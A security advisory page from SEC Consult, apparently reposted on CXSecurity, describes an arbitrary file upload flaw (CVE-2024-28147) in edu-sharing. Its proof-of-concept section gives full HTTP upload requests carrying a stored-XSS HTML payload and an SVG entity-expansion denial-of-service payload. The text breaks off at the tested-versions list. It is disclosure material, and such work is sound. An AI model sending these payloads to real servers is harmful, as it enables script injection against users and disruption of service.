---
title: Edu-Sharing Arbitrary File Upload
url: https://cxsecurity.com/issue/WLB-2024060057
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-25
fetch_date: 2025-10-06T16:54:39.468037
---

# Edu-Sharing Arbitrary File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Edu-Sharing Arbitrary File Upload** **2024.06.24**  Credit:  **[Kai Zimmermann](https://cxsecurity.com/author/Kai%2BZimmermann/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-28147](https://cxsecurity.com/cveshow/CVE-2024-28147/ "Click to see CVE-2024-28147")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

SEC Consult Vulnerability Lab Security Advisory < 20240620-0 >
=======================================================================
title: Arbitrary File Upload
product: edu-sharing (metaVentis GmbH)
vulnerable versions: <8.0.8-RC2, <8.1.4-RC0, <9.0.0-RC19
fixed versions: >=8.0.8-RC2, >=8.1.4-RC0, >=9.0.0-RC19
CVE number: CVE-2024-28147
impact: high
homepage: https://edu-sharing.com
found: 2024-04-04
by: Kai Zimmermann (Office Frankfurt)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"edu-sharing software enables you to network your learning platforms and other
educational software. Share learning content, metadata and tools - make them
available in an educational cloud and let your users use them in all connected
systems."
Source: https://edu-sharing.com
Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.
SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.
Vulnerability overview/description:
-----------------------------------
1) Arbitrary File Upload (CVE-2024-28147)
An authenticated user can upload arbitrary files in the upload function for
collection preview images. An attacker may upload an HTML file that includes
malicious JavaScript code which will be executed if a user visits the direct
URL of the collection preview image (Stored Cross Site Scripting). It is also
possible to upload SVG files that include nested XML entities. Those are parsed
when a user visits the direct URL of the collection preview image, which may be
utilized for a Denial of Service attack.
Proof of concept:
-----------------
1) Arbitrary File Upload (CVE-2024-28147)
An authenticated user can update the preview image of an existing collection
by sending the following request:
--------------------------------------------------------------------------------
POST /edu-sharing/rest/collection/v1/collections/-home-/$COLLECTIONID/icon?mimetype=image%2Fpng HTTP/1.1
Host: $SERVER
Cookie: INGRESSCOOKIE=$INGRESSCOOKIE; JSESSIONID=$SESSIONID
Content-Type: multipart/form-data; boundary=---------------------------159605426213527963452762824885
Content-Length: 288
-----------------------------159605426213527963452762824885
Content-Disposition: form-data; name="file";
PNG
[...]
-----------------------------159605426213527963452762824885--
--------------------------------------------------------------------------------
The URL parameter "mimetype" can be modified to match any uploaded file. The
value is directly used in the server's "Content-Type" header.
Both, the Content-Type request header and the filename parameter in the
Content-Disposition request header do not need to be included in the data
boundary inside the request in order to be sent successfully and can therefore
be removed.
The preview image can then be accessed by visiting the following URL:
https://$SERVER/edu-sharing/preview?nodeId=$COLLECTIONID
a. Stored Cross Site Scripting (HTML Upload)
The initial request can be modified to include an HTML file, while keeping
the magic bytes of a PNG image file. The "mimetype" parameter is changed to
"text/html":
--------------------------------------------------------------------------------
POST /edu-sharing/rest/collection/v1/collections/-home-/$COLLECTIONID/icon?mimetype=text/html HTTP/1.1
Host: $SERVER
Cookie: INGRESSCOOKIE=$INGRESSCOOKIE; JSESSIONID=$SESSIONID
Content-Type: multipart/form-data; boundary=---------------------------159605426213527963452762824885
Content-Length: 288
-----------------------------159605426213527963452762824885
Content-Disposition: form-data; name="file";
PNG
<!DOCTYPE html>
<html>
<body>
<h1>Test</h1>
<script>alert(window.location)</script>
</body>
</html>
-----------------------------159605426213527963452762824885--
--------------------------------------------------------------------------------
Visiting the preview URL as seen in figure 1 below shows that the JavaScript
code is executed:
[01\_stored\_xss.png]
b. Denial of Service (SVG Upload)
The initial request can be modified to upload an SVG file containing
nested XML entities. The "mimetype" parameter is changed to "image%2Fsvg":
--------------------------------------------------------------------------------
POST /edu-sharing/rest/collection/v1/collections/-home-/$COLLECTIONID/icon?mimetype=image%2Fsvg HTTP/1.1
Host: $SERVER
Cookie: INGRESSCOOKIE=$INGRESSCOOKIE; JSESSIONID=$SESSIONID
Content-Type: multipart/form-data; boundary=---------------------------29539943986372261721095197803
Content-Length: 581
-----------------------------29539943986372261721095197803
Content-Disposition: form-data; name="file";
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY bar "Text "><!ENTITY t1
"&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;"><!ENTITY t2 "&t1;&t1;&t1;&t1;">]>
<svg xmlns="http://www.w3.org/2000/svg">
<data>&t2;</data>
</svg>
-----------------------------29539943986372261721095197803--
--------------------------------------------------------------------------------
Visiting the preview URL as seen in figure 2 below shows that the XML code is
parsed:
[02\_denial\_of\_service]
Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:
\* 9...